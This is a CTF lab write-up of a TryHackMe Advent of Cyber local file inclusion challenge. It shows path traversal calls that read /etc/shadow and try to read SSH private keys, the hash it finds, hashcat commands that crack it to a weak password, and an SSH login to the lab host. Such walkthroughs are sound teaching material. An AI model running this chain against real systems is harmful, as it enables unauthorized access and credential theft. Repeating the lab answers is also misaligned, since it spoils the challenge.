# TryHackMe: Advent of Cyber, LFI

__1. What is Charlie going to book a holiday to?__

__2. Read /etc/shadow and crack Charlies password__

__3. What is flag1.txt?__

-----

## LFI vulnerability

After browsing the homepade's source code, I found a Javascript excerpt at the bottom of the page.

```javascript
function getNote(note, id) {
    const url = '/get-file/' + note.replace(/\//g, '%2f')
    $.getJSON(url,  function(data) {
        document.querySelector(id).innerHTML = 
            data.info.replace(/(?:\r\n|\r|\n)/g,'<br>');
    })
}
// getNote('server.js', '#note-1')
getNote('views/notes/note1.txt', '#note-1')
getNote('views/notes/note2.txt', '#note-2')
getNote('views/notes/note3.txt', '#note-3') 
```

The function `getNote()` fires a `$.getJSON` request to the server, on url `/get-file/filenamehere`.

This can be exploited.

## LFI Exploitation

Firstly I tested that the file's would switch; and fired off the following from my browser's console.

```js
getNote('views/notes/note3.txt','#note-1')
```

And found that `#note-1`'s content changed. I think slowly LFId my way to the `/etc/shadow` file with the following command.

```js
getNote('views/notes/../../../../../etc/shadow', '#note-1')
```

This eventually returned...

```
root:*:18152:0:99999:7:::
daemon:*:18152:0:99999:7:::
bin:*:18152:0:99999:7:::
sys:*:18152:0:99999:7:::
sync:*:18152:0:99999:7:::
games:*:18152:0:99999:7:::
man:*:18152:0:99999:7:::
lp:*:18152:0:99999:7:::
mail:*:18152:0:99999:7:::
news:*:18152:0:99999:7:::
uucp:*:18152:0:99999:7:::
proxy:*:18152:0:99999:7:::
www-data:*:18152:0:99999:7:::
backup:*:18152:0:99999:7:::
list:*:18152:0:99999:7:::
irc:*:18152:0:99999:7:::
gnats:*:18152:0:99999:7:::
nobody:*:18152:0:99999:7:::
systemd-timesync:*:18152:0:99999:7:::
systemd-network:*:18152:0:99999:7:::
systemd-resolve:*:18152:0:99999:7:::
systemd-bus-proxy:*:18152:0:99999:7:::
syslog:*:18152:0:99999:7:::
_apt:*:18152:0:99999:7:::
lxd:*:18152:0:99999:7:::
messagebus:*:18152:0:99999:7:::
uuidd:*:18152:0:99999:7:::
dnsmasq:*:18152:0:99999:7:::
sshd:*:18152:0:99999:7:::
pollinate:*:18152:0:99999:7:::
ubuntu:!:18243:0:99999:7:::
charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
```

## Attempted Looting

### SSH keys

We know that `charlie` and `ubuntu` are two potentially exploitable users. They could have SSH keys. 

```js
getNote('views/notes/../../../../../home/charlie/.ssh/id_rsa', '#note-1');
getNote('views/notes/../../../../../home/ubuntu/.ssh/id_rsa', '#note-2');
```

Though we get no response here; perhaps we don't have the appropriate permissions.

## Cracking `charlie`s password

We'll use `hashcat` for this.

```console
hashcat -a 0 -m 0 $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL. /usr/share/wordlists/fasttrack.txt
```

```console
kali@kali:~$ hashcat -a 0 -m 1800 '$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.' /usr/share/wordlists/fasttrack.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit   
                 
ATTENTION! Pure (unoptimized) backend kernels selected.                                                         
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.      
If you want to switch to optimized backend kernels, append -O to your commandline.                              
See the above message to find out about the exact limits.    
                       
Watchdog: Hardware monitoring interface not found on your system.   

Watchdog: Temperature abort trigger disabled.  

Host memory required for this attack: 65 MB   

Dictionary cache hit:
* Filename..: /usr/share/wordlists/fasttrack.txt                                                                
* Passwords.: 222                 
* Bytes.....: 2006                 
* Keyspace..: 222      

$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0K...GOyhL.
Time.Started.....: Fri Sep 18 16:56:51 2020 (0 secs)
Time.Estimated...: Fri Sep 18 16:56:51 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/fasttrack.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1029 H/s (10.50ms) @ Accel:32 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 128/222 (57.66%)
Rejected.........: 0/128 (0.00%)
Restore.Point....: 0/222 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: Spring2017 -> god

Started: Fri Sep 18 16:56:47 2020
Stopped: Fri Sep 18 16:56:53 2020
```


## Trying to SSH into the box with our cracked credentials

We get shell!

```shell
kali@kali:~$ ssh charlie@10.10.190.17
The authenticity of host '10.10.190.17 (10.10.190.17)' can't be established.
ECDSA key fingerprint is SHA256:zTb8DQ+FkYzMQWHtrqJMlZKGR8HKhFTeSzpis26L+0s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.190.17' (ECDSA) to the list of known hosts.
charlie@10.10.190.17's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.

Last login: Fri Dec 13 21:44:29 2019 from 10.8.11.98
charlie@ip-10-10-190-17:~$ 
```

## Looting `charlie`

### Flag1.txt
```
charlie@ip-10-10-190-17:~$ ls
flag1.txt
charlie@ip-10-10-190-17:~$ cat flag1.txt 
```

### Finding when Charlie is booking his holiday..

_Read note 3_ on the homepage.